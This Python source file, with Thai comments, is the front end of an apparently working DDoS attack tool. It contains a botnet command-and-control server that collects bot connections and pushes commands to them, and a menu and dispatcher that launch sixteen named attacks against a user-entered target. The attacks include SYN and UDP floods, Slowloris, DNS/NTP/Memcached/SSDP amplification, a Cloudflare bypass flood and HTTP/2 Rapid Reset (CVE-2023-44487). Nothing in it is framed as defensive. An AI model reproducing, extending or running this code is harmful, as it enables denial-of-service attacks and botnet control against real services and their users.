import threading  # นำเข้าโมดูล threading สำหรับการทำงานแบบมัลติเธรด
import socket  # นำเข้าโมดูล socket สำหรับการเชื่อมต่อเครือข่าย
from .config import CONFIG  # นำเข้าการตั้งค่าจาก config
from .utils import load_file_lines  # นำเข้าฟังก์ชันโหลดไฟล์
from .attacks import (  # นำเข้าฟังก์ชันโจมตีต่างๆ
    http_flood, async_http_flood, syn_flood, udp_flood,  # ฟังก์ชันโจมตี Layer 4 และ 7
    slowloris_attack, ntp_amplification, cloudflare_bypass_flood,  # ฟังก์ชันโจมตีพิเศษ
    memcached_amplification, ssdp_amplification, dns_amplification,  # ฟังก์ชันโจมตี Amplification
    rudy_attack, hoic_attack,  # ฟังก์ชันโจมตีพิเศษอื่นๆ
    http2_rapid_reset, apache_killer, nginx_range_dos  # ฟังก์ชันโจมตี Application Layer Exploits
)


# Botnet C2 Server  # คอมเมนต์ภาษาอังกฤษสำหรับคลาส
class BotnetC2:  # คลาสสำหรับเซิร์ฟเวอร์ Command and Control
    def __init__(self, host='0.0.0.0', port=6667):  # เมธอดเริ่มต้นของคลาส
        self.host = host  # เก็บค่า host
        self.port = port  # เก็บค่า port
        self.bots = {}  # พจนานุกรมเก็บข้อมูล bots
        self.commands = []  # ลิสต์เก็บคำสั่ง

    def start_server(self):  # เมธอดเริ่มเซิร์ฟเวอร์
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # สร้าง TCP socket
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # อนุญาตให้ใช้ address ซ้ำ
        server.bind((self.host, self.port))  # ผูก socket กับ host และ port
        server.listen(100)  # ฟังการเชื่อมต่อ (สูงสุด 100)
        print(f"Botnet C2 server started on {self.host}:{self.port}")  # แสดงข้อความเริ่มเซิร์ฟเวอร์

        while True:  # วนลูปไม่สิ้นสุด
            try:  # ลองรับการเชื่อมต่อ
                client, addr = server.accept()  # รับการเชื่อมต่อจาก client
                bot_id = f"{addr[0]}:{addr[1]}"  # สร้าง ID สำหรับ bot
                self.bots[bot_id] = client  # เพิ่ม bot เข้าไปในพจนานุกรม
                print(f"Bot connected: {bot_id}")  # แสดงข้อความ bot เชื่อมต่อ
                threading.Thread(target=self.handle_bot, args=(client, bot_id)).start()  # เริ่ม thread จัดการ bot
            except KeyboardInterrupt:  # จัดการ Ctrl+C
                break  # ออกจากลูป

    def handle_bot(self, client, bot_id):  # เมธอดจัดการ bot แต่ละตัว
        while True:  # วนลูปไม่สิ้นสุด
            try:  # ลองรับข้อมูล
                data = client.recv(1024)  # รับข้อมูลจาก bot (สูงสุด 1024 ไบต์)
                if not data:  # ถ้าไม่มีข้อมูล
                    break  # ออกจากลูป
                command = data.decode().strip()  # แปลงข้อมูลเป็น string และตัดช่องว่าง
                if command.startswith("RESULT:"):  # ถ้าเป็นผลลัพธ์
                    print(f"[{bot_id}] {command}")  # แสดงผลลัพธ์
                elif command == "PING":  # ถ้าเป็น ping
                    client.send(b"PONG")  # ตอบกลับ pong
            except:  # จัดการข้อผิดพลาด
                break  # ออกจากลูป
        if bot_id in self.bots:  # ถ้า bot ยังอยู่ในลิสต์
            del self.bots[bot_id]  # ลบ bot ออกจากลิสต์
        client.close()  # ปิดการเชื่อมต่อ client
        print(f"Bot disconnected: {bot_id}")  # แสดงข้อความ bot ตัดการเชื่อมต่อ

    def send_command(self, command):  # เมธอดส่งคำสั่งไปยัง bots
        for bot_id, client in self.bots.items():  # วนลูปทุกรายการใน bots
            try:  # ลองส่งคำสั่ง
                client.send(command.encode())  # ส่งคำสั่งที่เข้ารหัสเป็น bytes
            except:  # ถ้าส่งไม่ได้
                del self.bots[bot_id]  # ลบ bot ที่ส่งไม่ได้ออก


class Menu:  # คลาสสำหรับระบบเมนู
    """Menu system for the DDoS tool"""  # คอมเมนต์ภาษาอังกฤษของคลาส

    ATTACKS = {  # พจนานุกรมเก็บข้อมูลการโจมตีต่างๆ
        "1": {"name": "Layer 7 HTTP Flood (Basic)", "func": "http_flood", "needs_root": False},  # การโจมตี HTTP พื้นฐาน
        "2": {"name": "Layer 7 Async HTTP Flood (Advanced + Proxies)", "func": "async_http_flood", "needs_root": False},  # การโจมตี HTTP แบบ async
        "3": {"name": "Layer 4 SYN Flood", "func": "syn_flood", "needs_root": True},  # การโจมตี SYN Flood
        "4": {"name": "Layer 4 UDP Flood", "func": "udp_flood", "needs_root": True},  # การโจมตี UDP Flood
        "5": {"name": "Layer 7 Slowloris Attack", "func": "slowloris_attack", "needs_root": False},  # การโจมตี Slowloris
        "6": {"name": "NTP Amplification Attack", "func": "ntp_amplification", "needs_root": True},  # การโจมตี NTP Amplification
        "7": {"name": "Botnet C2 Server", "func": "botnet_c2", "needs_root": False},  # เซิร์ฟเวอร์ C2
        "8": {"name": "Cloudflare Bypass Flood", "func": "cloudflare_bypass_flood", "needs_root": False},  # การโจมตี Cloudflare Bypass
        "9": {"name": "Memcached Amplification Attack", "func": "memcached_amplification", "needs_root": True},  # การโจมตี Memcached Amplification
        "10": {"name": "SSDP Amplification Attack", "func": "ssdp_amplification", "needs_root": True},  # การโจมตี SSDP Amplification
        "11": {"name": "DNS Amplification Attack", "func": "dns_amplification", "needs_root": True},  # การโจมตี DNS Amplification
        "12": {"name": "RUDY (R U Dead Yet?) Attack", "func": "rudy_attack", "needs_root": False},  # การโจมตี RUDY
        "13": {"name": "HOIC (High Orbit Ion Cannon) Attack", "func": "hoic_attack", "needs_root": False},  # การโจมตี HOIC
        "14": {"name": "HTTP/2 Rapid Reset (CVE-2023-44487)", "func": "http2_rapid_reset", "needs_root": False},  # การโจมตี HTTP/2 Rapid Reset
        "15": {"name": "Apache Range Header DoS", "func": "apache_killer", "needs_root": False},  # การโจมตี Apache Killer
        "16": {"name": "Nginx Range Header DoS", "func": "nginx_range_dos", "needs_root": False}  # การโจมตี Nginx Range DoS
    }

    @staticmethod  # decorator สำหรับเมธอด static
    def display():  # เมธอดแสดงเมนู
        """Display the attack menu"""  # คอมเมนต์ภาษาอังกฤษของเมธอด
        print("\nSelect Attack Type:")  # แสดงข้อความเลือกประเภทการโจมตี
        for key, attack in Menu.ATTACKS.items():  # วนลูปแสดงรายการการโจมตี
            print(f"{key}. {attack['name']}")  # แสดงตัวเลือก
        return input("Enter choice: ").strip()  # รับค่าจากผู้ใช้และตัดช่องว่าง

    @staticmethod  # decorator สำหรับเมธอด static
    def get_attack_params(choice):  # เมธอดรับพารามิเตอร์การโจมตี
        """Get attack parameters based on choice"""  # คอมเมนต์ภาษาอังกฤษของเมธอด
        if choice == "7":  # ถ้าเลือก C2 server
            # Special case for C2 server  # คอมเมนต์ภาษาอังกฤษ
            c2_port = int(input("C2 Port (default 6667): ") or CONFIG['C2_DEFAULT_PORT'])  # รับพอร์ต C2
            return {"c2_port": c2_port}  # คืนค่าพารามิเตอร์

        # Standard parameters  # คอมเมนต์ภาษาอังกฤษสำหรับพารามิเตอร์ปกติ
        target = input("Target (IP or URL): ").strip()  # รับเป้าหมาย
        port = int(input(f"Port (default {CONFIG['DEFAULT_PORT']}): ") or CONFIG['DEFAULT_PORT'])  # รับพอร์ต
        threads = int(input(f"Threads (default {CONFIG['DEFAULT_THREADS']}): ") or CONFIG['DEFAULT_THREADS'])  # รับจำนวนเธรด
        duration = int(input(f"Duration (seconds, default {CONFIG['DEFAULT_DURATION']}): ") or CONFIG['DEFAULT_DURATION'])  # รับระยะเวลา
        proxy_file = input(f"Proxy file ({CONFIG['PROXY_FILE']}) or leave empty: ").strip()  # รับไฟล์พร็อกซี

        proxies = load_file_lines(proxy_file) if proxy_file else []  # โหลดไฟล์พร็อกซีถ้ามี

        return {  # คืนค่าพจนานุกรมที่มีพารามิเตอร์
            "target": target,  # เป้าหมาย
            "port": port,  # พอร์ต
            "threads": threads,  # จำนวนเธรด
            "duration": duration,  # ระยะเวลา
            "proxies": proxies  # รายการพร็อกซี
        }


class AttackDispatcher:  # คลาสสำหรับจัดการการโจมตี
    """Handles attack execution"""  # คอมเมนต์ภาษาอังกฤษของคลาส

    @staticmethod  # decorator สำหรับเมธอด static
    def execute(choice, params):  # เมธอดดำเนินการโจมตี
        """Execute the selected attack"""  # คอมเมนต์ภาษาอังกฤษของเมธอด
        attack_info = Menu.ATTACKS.get(choice)  # รับข้อมูลการโจมตีจากเมนู
        if not attack_info:  # ถ้าไม่พบข้อมูล
            print("Invalid choice!")  # แสดงข้อความเลือกไม่ถูกต้อง
            return  # ออกจากฟังก์ชัน

        # Check root privileges if needed  # คอมเมนต์ภาษาอังกฤษ
        from utils import check_root_privileges  # นำเข้าฟังก์ชันตรวจสอบสิทธิ์
        if attack_info["needs_root"] and not check_root_privileges():  # ถ้าต้องการ root และไม่มีสิทธิ์
            print(f"{attack_info['name']} requires root privileges!")  # แสดงข้อความต้องการสิทธิ์ root
            return  # ออกจากฟังก์ชัน

        # Special cases  # คอมเมนต์ภาษาอังกฤษสำหรับกรณีพิเศษ
        if choice == "7":  # ถ้าเลือก C2 server
            c2 = BotnetC2(port=params["c2_port"])  # สร้างออบเจ็กต์ C2
            try:  # ลองเริ่มเซิร์ฟเวอร์
                c2.start_server()  # เริ่มเซิร์ฟเวอร์ C2
            except KeyboardInterrupt:  # จัดการ Ctrl+C
                print("C2 server stopped")  # แสดงข้อความหยุดเซิร์ฟเวอร์
            return  # ออกจากฟังก์ชัน

        # Prepare target URL/IP  # คอมเมนต์ภาษาอังกฤษสำหรับเตรียมเป้าหมาย
        target = params["target"]  # รับค่าเป้าหมาย
        port = params["port"]  # รับค่าพอร์ต
        duration = params["duration"]  # รับค่าระยะเวลา
        threads = params["threads"]  # รับค่าจำนวนเธรด
        proxies = params["proxies"]  # รับค่ารายการพร็อกซี

        # Execute attack  # คอมเมนต์ภาษาอังกฤษสำหรับดำเนินการโจมตี
        if choice == "1":  # ถ้าเลือก HTTP Flood พื้นฐาน
            url = target if target.startswith("http") else f"http://{target}"  # เตรียม URL
            for _ in range(threads):  # วนลูปตามจำนวนเธรด
                threading.Thread(target=http_flood, args=(url, duration, proxies), daemon=True).start()  # เริ่มเธรดโจมตี

        elif choice == "2":  # ถ้าเลือก Async HTTP Flood
            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
            asyncio.run(async_http_flood(url, duration, proxies))  # รัน async function

        elif choice == "3":  # ถ้าเลือก SYN Flood
            for _ in range(threads):  # วนลูปตามจำนวนเธรด
                threading.Thread(target=syn_flood, args=(target, port, duration), daemon=True).start()  # เริ่มเธรดโจมตี

        elif choice == "4":  # ถ้าเลือก UDP Flood
            for _ in range(threads):  # วนลูปตามจำนวนเธรด
                threading.Thread(target=udp_flood, args=(target, port, duration), daemon=True).start()  # เริ่มเธรดโจมตี

        elif choice == "5":  # ถ้าเลือก Slowloris Attack
            slowloris_attack(target, port, duration, threads)  # เรียกฟังก์ชันโจมตี

        elif choice == "6":  # ถ้าเลือก NTP Amplification
            ntp_amplification(target, port, duration)  # เรียกฟังก์ชันโจมตี

        elif choice == "8":  # ถ้าเลือก Cloudflare Bypass
            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
            cloudflare_bypass_flood(url, duration, proxies)  # เรียกฟังก์ชันโจมตี

        elif choice == "9":  # ถ้าเลือก Memcached Amplification
            memcached_amplification(target, port, duration)  # เรียกฟังก์ชันโจมตี

        elif choice == "10":  # ถ้าเลือก SSDP Amplification
            ssdp_amplification(target, port, duration)  # เรียกฟังก์ชันโจมตี

        elif choice == "11":  # ถ้าเลือก DNS Amplification
            dns_amplification(target, port, duration)  # เรียกฟังก์ชันโจมตี

        elif choice == "12":  # ถ้าเลือก RUDY Attack
            rudy_attack(target, port, duration)  # เรียกฟังก์ชันโจมตี

        elif choice == "13":  # ถ้าเลือก HOIC Attack
            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
            hoic_attack(url, duration, proxies)  # เรียกฟังก์ชันโจมตี

        elif choice == "14":  # ถ้าเลือก HTTP/2 Rapid Reset
            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
            http2_rapid_reset(url, duration, proxies)  # เรียกฟังก์ชันโจมตี

        elif choice == "15":  # ถ้าเลือก Apache Killer
            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
            apache_killer(url, duration, proxies)  # เรียกฟังก์ชันโจมตี

        elif choice == "16":  # ถ้าเลือก Nginx Range DoS
            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
            nginx_range_dos(url, duration, proxies)  # เรียกฟังก์ชันโจมตี

        print(f"Attack launched on {target}:{port} for {duration}s!")  # แสดงข้อความเริ่มโจมตี